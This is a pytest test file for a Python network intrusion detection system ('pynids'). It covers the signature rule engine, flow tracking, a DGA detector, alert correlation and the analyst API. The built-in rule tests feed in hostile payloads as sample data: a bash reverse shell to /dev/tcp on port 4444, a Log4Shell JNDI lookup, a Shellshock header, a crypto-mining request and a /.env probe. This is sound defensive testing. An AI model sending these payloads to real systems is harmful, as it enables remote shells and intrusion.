"""Tests for the tuned rule engine, flow tracking accuracy, the DGA detector,
the built-in ruleset and the analyst API views."""
from __future__ import annotations

from pathlib import Path

import pytest
import yaml

from pynids.alerts.manager import AlertManager
from pynids.alerts.mitre import technique
from pynids.alerts.model import Alert, AlertType, Severity
from pynids.detection.behavioral import DgaDetector
from pynids.detection.signature import (
    SignatureDetector, _apply_op, _eval_node, _get_field, compile_rules, validate_rules,
)
from pynids.engine import BUILTIN_RULES, DetectionEngine, load_rule_files
from pynids.flow.tracker import FlowState, FlowTracker
from tests.conftest import AlertCollector, make_meta

SYN, SYNACK, ACK, FIN, RST, PSH = 0x02, 0x12, 0x10, 0x01, 0x04, 0x08


def rule(match, **extra):
    return {"id": extra.pop("id", "T-1"), "description": "t", "severity": "HIGH", "match": match, **extra}


def fire(rules, meta, layer7=None, flow=None):
    return list(SignatureDetector(rules).analyze(meta, layer7 or {}, flow))


# ---------------------------------------------------------------------------
# Rule engine
# ---------------------------------------------------------------------------

class TestByteMatching:
    def test_regex_sees_the_payload_not_its_repr(self):
        r = rule({"field": "payload_bytes", "op": "regex", "value": r"^PASS\s+\S"})
        assert fire([r], make_meta(dst_port=21, payload=b"PASS hunter2\r\n"))
        assert not fire([r], make_meta(dst_port=21, payload=b"USER bob\r\n"))

    def test_end_anchor_and_startswith_work_on_bytes(self):
        assert _apply_op("regex", b"sh -i 0>&1", r"0>&1\s*$")
        assert _apply_op("startswith", b"SSH-2.0-OpenSSH", "SSH-2.0")
        assert _apply_op("endswith", b"abc\r\n", "\\x0d\\x0a")

    def test_hex_escapes_match_raw_bytes(self):
        r = rule({"field": "payload_bytes", "op": "startswith", "value": "\\x17\\x00\\x03\\x2a"})
        assert fire([r], make_meta(protocol="udp", dst_port=123, payload=b"\x17\x00\x03\x2a" + b"\x00" * 4))
        smb = rule({"field": "payload_bytes", "op": "contains", "value": "\\xffSMB\\x72"})
        assert fire([smb], make_meta(dst_port=445, payload=b"\x00\x00\x00\x85\xffSMB\x72\x00"))
        assert not fire([smb], make_meta(dst_port=445, payload=b"\x00\x00\x00\x85\xfeSMB\x40\x00"))


class TestOperatorsAndFields:
    def test_cidr_and_endswith_and_not_contains(self):
        assert _apply_op("cidr", "10.1.2.3", "10.0.0.0/8")
        assert _apply_op("cidr", "192.168.1.9", ["10.0.0.0/8", "192.168.0.0/16"])
        assert not _apply_op("cidr", "8.8.8.8", "10.0.0.0/8")
        assert not _apply_op("cidr", "not-an-ip", "10.0.0.0/8")
        assert _apply_op("endswith", "evil.onion", ".onion")
        assert _apply_op("not_contains", "hello", "xyz") and not _apply_op("not_contains", "hello", "ell")
        assert not _apply_op("not_contains", None, "x")

    def test_computed_fields(self):
        syn = make_meta(src_ip="8.8.8.8", dst_ip="192.168.1.5", tcp_flags=SYN, payload=b"abc")
        assert _get_field("tcp.syn", syn, {}) is True
        assert _get_field("tcp.syn", make_meta(tcp_flags=SYNACK), {}) is False
        assert _get_field("tcp.syn", make_meta(protocol="udp"), {}) is None
        assert _get_field("tcp.xmas", make_meta(tcp_flags=0x29), {}) is True
        assert _get_field("payload_len", syn, {}) == 3
        assert _get_field("src_scope", syn, {}) == "public"
        assert _get_field("dst_scope", syn, {}) == "private"
        assert _get_field("direction", syn, {"context": {"direction": "inbound"}}) == "inbound"
        assert _get_field("context.app", syn, {"context": {"app": "curl"}}) == "curl"

    def test_flow_fields(self):
        tracker = FlowTracker()
        meta = make_meta(tcp_flags=SYN)
        flow = tracker.update(meta)
        assert _get_field("flow.new", meta, {}, flow) is True
        assert _eval_node({"field": "flow.packets", "op": "eq", "value": 1}, meta, {}, flow)
        assert _get_field("flow.new", meta, {}, None) is None

    def test_port_rule_fires_on_the_syn_only(self):
        r = rule({"all": [{"field": "tcp.syn", "op": "eq", "value": True},
                          {"field": "dst_port", "op": "eq", "value": 23}]})
        det = SignatureDetector([r])
        hits = []
        for flags in (SYN, ACK, PSH | ACK, PSH | ACK, FIN | ACK):
            hits += det.analyze(make_meta(dst_port=23, tcp_flags=flags, payload=b"x"), {}, None)
        assert len(hits) == 1


class TestCompilation:
    def test_bad_rules_are_reported_and_skipped(self):
        good = rule({"field": "dst_port", "op": "eq", "value": 22}, id="GOOD")
        compiled, problems = compile_rules([
            good,
            rule({"field": "payload_bytes", "op": "regex", "value": "("}, id="BAD-RE"),
            rule({"field": "dst_port", "op": "bogus", "value": 1}, id="BAD-OP"),
            rule({"field": "src_ip", "op": "cidr", "value": "999.0.0.0/8"}, id="BAD-NET"),
            {"id": "NO-MATCH", "severity": "LOW"},
            rule({"field": "dst_port", "op": "eq", "value": 1}, id="BAD-SEV", severity="URGENT"),
            rule({"field": "dst_port", "op": "eq", "value": 2}, id="GOOD"),
        ])
        assert [c.rule_id for c in compiled] == ["GOOD"]
        assert len(problems) == 6
        # The good rule still works next to the broken ones.
        det = SignatureDetector([good, rule({"field": "x", "op": "regex", "value": "("}, id="BAD")])
        assert len(list(det.analyze(make_meta(dst_port=22), {}, None))) == 1
        assert det.problems

    def test_disabled_rules_do_not_fire(self):
        r = rule({"field": "dst_port", "op": "eq", "value": 22}, enabled=False)
        assert not fire([r], make_meta(dst_port=22))
        assert SignatureDetector([r]).rule_stats()[0]["status"] == "disabled"

    def test_validate_flags_unknown_keys(self):
        problems = validate_rules([rule({"field": "dst_port", "op": "eq", "value": 1}, sevrity="HIGH")])
        assert any("unknown key" in p for p in problems)

    def test_payload_rules_are_skipped_on_empty_packets(self):
        compiled, _ = compile_rules([
            rule({"all": [{"field": "protocol", "op": "eq", "value": "tcp"},
                          {"field": "payload_bytes", "op": "contains", "value": "x"}]}, id="DATA"),
            rule({"field": "dst_port", "op": "eq", "value": 23}, id="PORT"),
            rule({"not": {"field": "layer7.tls.sni", "op": "exists"}}, id="NEG"),
        ])
        assert [c.needs_data for c in compiled] == [True, False, False]


class TestThresholdsAndEvidence:
    def test_threshold_track_by_pair_and_reset(self):
        r = rule({"field": "dst_port", "op": "eq", "value": 22},
                 threshold={"count": 3, "seconds": 60, "track_by": "pair"})
        det = SignatureDetector([r])
        out = []
        for i in range(9):  # three targets, three hits each
            out += det.analyze(make_meta(dst_ip=f"10.0.0.{i % 3}", dst_port=22, timestamp=1000.0 + i), {}, None)
        assert len(out) == 3
        assert out[0].evidence["threshold"]["hits"] == 3

    def test_message_template_and_matched_evidence(self):
        r = rule({"all": [{"field": "dst_port", "op": "eq", "value": 21},
                          {"field": "payload_bytes", "op": "regex", "value": r"^PASS\s"}]},
                 message="FTP password sent to {dst_ip} ({layer7.http.host})", why="because", response="do x")
        alert = fire([r], make_meta(dst_ip="45.33.32.9", dst_port=21, payload=b"PASS secret\r\n"))[0]
        assert alert.message == "FTP password sent to 45.33.32.9 (?)"
        fields = {m["field"] for m in alert.evidence["matched"]}
        assert fields == {"dst_port", "payload_bytes"}
        assert alert.evidence["rule"] == {"why": "because", "response": "do x"}
        assert "headers" not in str(alert.evidence.get("layer7", {}))

    def test_rule_stats_count_hits(self):
        det = SignatureDetector([rule({"field": "dst_port", "op": "eq", "value": 22})])
        list(det.analyze(make_meta(dst_port=22), {}, None))
        stats = det.rule_stats()[0]
        assert stats["hits"] == 1 and stats["status"] == "active" and stats["last_hit"]


# ---------------------------------------------------------------------------
# Built-in ruleset
# ---------------------------------------------------------------------------

class TestBuiltinRules:
    def test_every_rule_compiles_and_is_documented(self):
        rules = yaml.safe_load(Path(BUILTIN_RULES).read_text(encoding="utf-8"))["rules"]
        assert validate_rules(rules) == []
        compiled, problems = compile_rules(rules)
        assert not problems and len(compiled) == len(rules) >= 50
        for r in rules:
            assert r.get("why") and r.get("response"), r["id"]

    def test_old_link_points_at_the_packaged_file(self):
        link = Path(__file__).resolve().parent.parent / "rules" / "enterprise_rules.yaml"
        assert link.resolve() == Path(BUILTIN_RULES).resolve()

    def _engine(self):
        mgr = AlertManager(dedup_window=0)
        sink = AlertCollector()
        mgr.register_output(sink)
        return DetectionEngine(config={}, rules_path=str(BUILTIN_RULES), alert_manager=mgr), sink

    def _ids(self, sink):
        return {a.rule_id for a in sink.alerts if a.alert_type == AlertType.SIGNATURE}

    def test_lan_smb_is_quiet_but_internet_smb_alerts(self):
        engine, sink = self._engine()
        engine.process_packet(make_meta(src_ip="192.168.1.5", dst_ip="192.168.1.9", dst_port=445, tcp_flags=SYN))
        assert not self._ids(sink)
        engine.process_packet(make_meta(src_ip="192.168.1.5", dst_ip="45.33.32.7", dst_port=445,
                                        src_port=50001, tcp_flags=SYN))
        engine.process_packet(make_meta(src_ip="185.220.101.4", dst_ip="192.168.1.5", dst_port=445,
                                        src_port=50002, tcp_flags=SYN))
        assert self._ids(sink) == {"SIG-CRED-008", "SIG-LAT-001"}

    def test_replies_to_an_irc_looking_port_do_not_alert(self):
        engine, sink = self._engine()
        engine.process_packet(make_meta(src_ip="45.33.32.7", dst_ip="192.168.1.5", src_port=443,
                                        dst_port=6667, tcp_flags=ACK, payload=b"\x17\x03\x03"))
        assert not self._ids(sink)

    @pytest.mark.parametrize("payload,port,expected", [
        (b"GET /x HTTP/1.1\r\nHost: a\r\nUser-Agent: () { :;}; /bin/id\r\n\r\n", 80, "SIG-EXP-004"),
        (b"GET /?q=${jndi:ldap://45.33.32.9/a} HTTP/1.1\r\nHost: a\r\n\r\n", 8080, "SIG-EXP-005"),
        (b"bash -i >& /dev/tcp/45.33.32.9/4444 0>&1\n", 4444, "SIG-EXE-001"),
        (b'{"id":1,"method":"mining.subscribe","params":["x"]}\n', 3333, "SIG-C2-009"),
        (b"GET /.env HTTP/1.1\r\nHost: shop.example\r\n\r\n", 80, "SIG-EXP-008"),
        (b"PASS hunter2\r\n", 21, "SIG-CRED-001"),
    ])
    def test_payload_rules(self, payload, port, expected):
        engine, sink = self._engine()
        engine.process_packet(make_meta(src_ip="192.168.1.5", dst_ip="45.33.32.9", dst_port=port,
                                        tcp_flags=PSH | ACK, payload=payload))
        assert expected in self._ids(sink)

    def test_ordinary_browsing_is_silent(self):
        engine, sink = self._engine()
        engine.process_packet(make_meta(src_ip="192.168.1.5", dst_ip="93.184.215.14", dst_port=80,
                                        tcp_flags=PSH | ACK,
                                        payload=b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n"
                                                b"User-Agent: Mozilla/5.0 (Macintosh)\r\n\r\n"))
        assert not self._ids(sink)


class TestRuleFiles:
    def test_later_files_override_by_id(self, tmp_path):
        base = tmp_path / "base.yaml"
        local = tmp_path / "local.yaml"
        base.write_text(yaml.safe_dump({"rules": [
            rule({"field": "dst_port", "op": "eq", "value": 22}, id="A"),
            rule({"field": "dst_port", "op": "eq", "value": 23}, id="B"),
        ]}))
        local.write_text(yaml.safe_dump({"rules": [{"id": "A", "enabled": False}, {"id": "B", "severity": "LOW"}]}))
        merged = {r["id"]: r for r in load_rule_files([str(base), str(local), str(tmp_path / "missing.yaml")])}
        assert merged["A"]["enabled"] is False and "match" in merged["A"]
        assert merged["B"]["severity"] == "LOW"

        engine = DetectionEngine(config={}, rules_path=[str(base), str(local)],
                                 alert_manager=AlertManager(dedup_window=0))
        a = engine.process_packet(make_meta(dst_port=22))
        b = engine.process_packet(make_meta(dst_port=23, src_port=40000))
        assert not [x for x in a if x.rule_id == "A"]
        assert [x.severity for x in b if x.rule_id == "B"] == [Severity.LOW]
        statuses = {r["id"]: r["status"] for r in engine.rules()["rules"]}
        assert statuses == {"A": "disabled", "B": "active"}


# ---------------------------------------------------------------------------
# Flow tracking
# ---------------------------------------------------------------------------

class TestFlowAccuracy:
    def test_synack_seen_first_still_names_the_client(self):
        tracker = FlowTracker()
        flow = tracker.update(make_meta(src_ip="93.184.215.14", dst_ip="10.0.0.2", src_port=443,
                                        dst_port=50000, tcp_flags=SYNACK))
        assert (flow.src_ip, flow.dst_port, flow.initiator_inferred) == ("10.0.0.2", 443, True)

    def test_reply_from_a_service_port_seen_first(self):
        tracker = FlowTracker()
        flow = tracker.update(make_meta(src_ip="10.0.0.1", dst_ip="10.0.0.2", src_port=53, dst_port=50000,
                                        protocol="udp", payload=b"answer"))
        assert flow.src_ip == "10.0.0.2" and flow.bytes_from_src == 0 and flow.bytes_to_src == 6

    def test_direction_counters_and_history(self):
        tracker = FlowTracker()
        c, s = dict(src_ip="10.0.0.2", dst_ip="1.1.1.1", src_port=50000, dst_port=443), \
            dict(src_ip="1.1.1.1", dst_ip="10.0.0.2", src_port=443, dst_port=50000)
        tracker.update(make_meta(**c, tcp_flags=SYN))
        tracker.update(make_meta(**s, tcp_flags=SYNACK))
        tracker.update(make_meta(**c, tcp_flags=ACK))
        tracker.update(make_meta(**c, tcp_flags=PSH | ACK, payload=b"hello"))
        flow = tracker.update(make_meta(**s, tcp_flags=PSH | ACK, payload=b"world!!"))
        assert flow.state == FlowState.ESTABLISHED and flow.outcome == "established"
        assert (flow.bytes_from_src, flow.bytes_to_src, flow.packets_from_src, flow.packets_to_src) == (5, 7, 3, 2)
        assert flow.history == "ShADd"
        tracker.update(make_meta(**c, tcp_flags=FIN | ACK))
        flow = tracker.update(make_meta(**s, tcp_flags=FIN | ACK))
        assert flow.state == FlowState.CLOSED and flow.outcome == "closed"

    def test_refused_and_unanswered_connections(self):
        tracker = FlowTracker()
        syn = make_meta(src_ip="10.0.0.2", dst_ip="10.0.0.9", src_port=50001, dst_port=8443, tcp_flags=SYN)
        assert tracker.update(syn).outcome == "attempt"
        flow = tracker.update(make_meta(src_ip="10.0.0.9", dst_ip="10.0.0.2", src_port=8443, dst_port=50001,
                                        tcp_flags=RST | ACK))
        assert flow.outcome == "rejected" and flow.state == FlowState.CLOSED

    def test_reused_port_pair_starts_a_new_flow(self):
        tracker = FlowTracker()
        meta = dict(src_ip="10.0.0.2", dst_ip="10.0.0.9", src_port=50002, dst_port=22)
        tracker.update(make_meta(**meta, tcp_flags=SYN, payload=b""))
        tracker.update(make_meta(**meta, tcp_flags=PSH | ACK, payload=b"x" * 100))
        tracker.update(make_meta(**meta, tcp_flags=RST))
        flow = tracker.update(make_meta(**meta, tcp_flags=SYN))
        assert flow.packet_count == 1 and flow.byte_count == 0 and flow.state == FlowState.NEW
        assert tracker.active_count == 1 and tracker.total_flows == 2

    def test_udp_exchange_after_a_long_gap_is_a_new_flow(self):
        tracker = FlowTracker(udp_session_gap=60)
        meta = dict(src_ip="10.0.0.2", dst_ip="45.33.32.5", src_port=40000, dst_port=4500, protocol="udp")
        tracker.update(make_meta(**meta, timestamp=1000.0, payload=b"a"))
        assert tracker.update(make_meta(**meta, timestamp=1010.0, payload=b"a")).packet_count == 2
        assert tracker.update(make_meta(**meta, timestamp=1100.0, payload=b"a")).packet_count == 1

    def test_snapshot_and_counts(self):
        tracker = FlowTracker()
        tracker.update(make_meta(src_port=50000, dst_port=443, tcp_flags=SYN, timestamp=10.0))
        tracker.update(make_meta(src_port=50001, dst_port=53, protocol="udp", payload=b"q" * 40, timestamp=20.0))
        rows = tracker.snapshot(limit=10)
        assert [r["dst_port"] for r in rows] == [53, 443]
        assert tracker.snapshot(limit=1, sort="bytes")[0]["bytes"] == 40
        assert tracker.counts()["active"] == 2 and tracker.counts()["udp"] == 1

    def test_engine_attaches_flow_facts_to_alerts(self):
        mgr = AlertManager(dedup_window=0)
        engine = DetectionEngine(config={}, rules_path=str(BUILTIN_RULES), alert_manager=mgr)
        alerts = engine.process_packet(make_meta(src_ip="192.168.1.5", dst_ip="45.33.32.9", dst_port=21,
                                                 tcp_flags=PSH | ACK, payload=b"PASS hunter2\r\n"))
        hit = [a for a in alerts if a.rule_id == "SIG-CRED-001"][0]
        assert hit.flow_id and hit.context["flow"]["packets"] == 1
        assert hit.context["flow"]["bytes_out"] == len(b"PASS hunter2\r\n")
        assert engine.flows()[0]["dst_port"] == 21


# ---------------------------------------------------------------------------
# DGA detector
# ---------------------------------------------------------------------------

def _nx(name, i, client="192.168.1.5"):
    meta = make_meta(src_ip="192.168.1.1", dst_ip=client, src_port=53, dst_port=50000 + i,
                     protocol="udp", timestamp=1000.0 + i)
    return meta, {"dns": {"is_response": True, "rcode": 3, "query_name": name}}


class TestDgaDetector:
    def test_many_random_domains_alert_once(self):
        det = DgaDetector(nxdomain_threshold=10, window=60)
        names = ["xkqjzvwpah", "qwmzlpxkdr", "zpvkqmwxjt", "bqxzkwjvpm", "wjxqzkvpbn", "kzqxwvjpmd",
                 "pqzxkwvjmb", "vxqzkwpjmc", "mzqxkwvjpl", "jzqxkwvpmg", "hzqxkwvjpf", "gzqxkwvjps"]
        out = []
        for i, n in enumerate(names):
            out += det.analyze(*_nx(f"{n}{i}abcd.com", i), None)
        assert len(out) == 1
        assert out[0].severity == Severity.HIGH and out[0].src_ip == "192.168.1.5"
        assert out[0].evidence["looks_generated"] is True and out[0].mitre_technique == "T1568.002"

    def test_one_broken_domain_and_local_names_do_not_alert(self):
        det = DgaDetector(nxdomain_threshold=5, window=60)
        out = []
        for i in range(40):
            out += det.analyze(*_nx(f"host{i}.broken-app.com", i), None)       # one registered domain
            out += det.analyze(*_nx(f"printer{i}.local", i), None)             # private zone
            out += det.analyze(*_nx(f"randomlabel{i}", i), None)               # single label
        assert out == []

    def test_successful_answers_are_ignored(self):
        det = DgaDetector(nxdomain_threshold=2, window=60)
        meta, l7 = _nx("a.example.com", 1)
        l7["dns"]["rcode"] = 0
        assert list(det.analyze(meta, l7, None)) == []


# ---------------------------------------------------------------------------
# Correlation and MITRE catalogue
# ---------------------------------------------------------------------------

def _alert(rule_id, severity=Severity.MEDIUM, tags=(), mitre=None):
    return Alert(alert_type=AlertType.SIGNATURE, severity=severity, message=rule_id, src_ip="45.33.32.50",
                 dst_ip="192.168.1.5", dst_port=80, rule_id=rule_id, tags=list(tags), mitre_technique=mitre)


class TestCorrelationTuning:
    def _run(self, alerts):
        mgr = AlertManager(dedup_window=0, correlation_threshold=3)
        sink = AlertCollector()
        mgr.register_output(sink)
        for a in alerts:
            mgr.add(a)
        return [a for a in sink.alerts if a.alert_type == AlertType.CORRELATION]

    def test_low_and_hygiene_alerts_do_not_make_an_attack(self):
        assert not self._run([_alert("A", Severity.LOW), _alert("B", Severity.LOW), _alert("C", Severity.LOW)])
        assert not self._run([_alert("A", tags=["policy"]), _alert("B", tags=["new_program"]),
                              _alert("C", tags=["baseline"]), _alert("D", tags=["new_device"])])

    def test_chain_lists_the_contributing_detections(self):
        corr = self._run([_alert("A", mitre="T1046"), _alert("B", mitre="T1190"),
                          _alert("C", Severity.HIGH, mitre="T1071.001")])
        assert len(corr) == 1 and corr[0].dst_ip is None
        assert [c["detection"] for c in corr[0].evidence["chain"]] == ["A", "B", "C"]
        assert corr[0].evidence["tactics"] == ["Discovery", "Initial Access", "Command and Control"]


def test_mitre_catalogue():
    assert technique("T1071.004") == {"id": "T1071.004", "name": "DNS", "tactic": "Command and Control",
                                      "url": "https://attack.mitre.org/techniques/T1071/004/"}
    assert technique("t1190")["tactic"] == "Initial Access"
    assert technique("T9999")["name"] is None and technique(None) is None


# ---------------------------------------------------------------------------
# API views
# ---------------------------------------------------------------------------

class TestAnalystApi:
    def test_live_detections_summary(self):
        from pynids.service.live import LiveState
        live = LiveState()
        live.emit(_alert("SIG-EXP-005", Severity.CRITICAL, mitre="T1190"))
        live.emit(_alert("SIG-EXP-005", Severity.CRITICAL, mitre="T1190"))
        live.emit(Alert(alert_type=AlertType.BEHAVIORAL, severity=Severity.HIGH, message="beacon",
                        src_ip="192.168.1.5", dst_ip="45.33.32.50", tags=["beaconing", "c2"],
                        mitre_technique="T1071", context={"remote_ip": "45.33.32.50"}))
        d = live.detections()
        assert [(t["tactic"], t["count"]) for t in d["tactics"]] == [("Initial Access", 2), ("Command and Control", 1)]
        assert {x["name"]: x["count"] for x in d["detections"]} == {"SIG-EXP-005": 2, "detector:beaconing": 1}
        assert d["sources"][0]["ip"] == "45.33.32.50" and d["sources"][0]["worst"] == "CRITICAL"
        assert live.recent_alerts()[0]["mitre"]["name"] == "Application Layer Protocol"

    def test_flows_rules_and_export_routes(self):
        import json
        import threading
        import urllib.request
        from pynids.service.api import ServiceContext, make_server
        from pynids.service.live import LiveState

        live = LiveState()
        mgr = AlertManager(dedup_window=0)
        mgr.register_output(live)
        engine = DetectionEngine(config={}, rules_path=str(BUILTIN_RULES), alert_manager=mgr)
        engine.process_packet(make_meta(src_ip="192.168.1.5", dst_ip="45.33.32.9", dst_port=21,
                                        tcp_flags=PSH | ACK, payload=b"PASS hunter2\r\n"))
        server = make_server(ServiceContext(live=live, token="t0ken", engine=engine), port=0)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()

        def get(path):
            req = urllib.request.Request(f"http://127.0.0.1:{port}{path}", headers={"X-PyNIDS-Token": "t0ken"})
            with urllib.request.urlopen(req, timeout=5) as res:
                return res.headers, res.read().decode()

        try:
            flows = json.loads(get("/api/flows?q=45.33.32.9")[1])
            assert flows["total"] == 1 and flows["flows"][0]["dst_port"] == 21
            assert json.loads(get("/api/flows?q=nothing-matches")[1])["flows"] == []
            rules = json.loads(get("/api/rules")[1])
            assert not rules["problems"]
            assert [r["hits"] for r in rules["rules"] if r["id"] == "SIG-CRED-001"] == [1]
            assert json.loads(get("/api/detections")[1])["detections"][0]["name"] == "SIG-CRED-001"
            assert len(json.loads(get("/api/alerts?rule=SIG-CRED-001")[1])) == 1
            assert json.loads(get("/api/alerts?rule=SIG-NOPE")[1]) == []
            headers, body = get("/api/alerts/export?format=csv")
            assert "attachment" in headers["Content-Disposition"]
            assert body.splitlines()[0].startswith("timestamp,severity,kind,rule_id")
            assert "SIG-CRED-001" in body
            assert json.loads(get("/api/alerts/export?format=jsonl")[1].splitlines()[0])["rule_id"] == "SIG-CRED-001"
        finally:
            server.shutdown()
            server.server_close()
